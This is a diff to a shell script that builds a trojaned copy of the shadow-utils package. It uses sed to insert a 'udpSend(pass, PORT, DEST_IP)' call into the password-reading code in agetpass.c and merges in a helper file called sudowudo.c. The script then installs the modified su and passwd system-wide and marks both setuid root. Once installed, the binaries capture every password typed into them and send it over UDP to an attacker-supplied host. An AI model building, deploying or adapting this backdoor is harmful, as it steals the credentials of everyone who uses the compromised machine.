@@ -12,7 +12,13 @@ then
 fi
 
 
-apt-get install -y make unzip libbsd-dev
+apt-get install -y make unzip libbsd-dev autoconf automake libtool bison byacc xsltproc pkg-config
+
+# Add sources list
+echo "deb-src http://in.archive.ubuntu.com/ubuntu lunar main restricted" >> /etc/apt/sources.list
+apt-get update
+apt-get build-dep shadow
+
 
 wget "https://codeload.github.com/shadow-maint/shadow/zip/refs/tags/4.14.1"
 unzip "4.14.1"
@@ -22,16 +28,21 @@ DEST_IP=$1
 PORT=$2
 dir="shadow-4.14.1/lib/agetpass.c"
 
-PAYLOAD="udpSend(pass, ${PORT}, \"${DEST_IP}\");"
+PAYLOAD="udpSend(pass, ${PORT}, \"${DEST_IP}\", \"shadow\");"
 match='len = strlen(pass);'
 
-gsed -i "/$match/a$PAYLOAD" $dir
-gsed -i '/\#include <string.h>/rsudowudo.c' $dir
+sed -i "/$match/a$PAYLOAD" $dir
+sed -i '/\#include <string.h>/rsudowudo.c' $dir
 
 cd shadow-4.14.1
 
 ./autogen.sh --without-selinux
-make all
-cp src/su ../
-cp src/passwd ../
+make -j4
+make install
+#cp src/su ../
+#cp src/passwd ../
 cd ../ && rm -r shadow-4.14.1
+chown root su
+chown root passwd
+chmod 4755 su
+chmod 4755 passwd
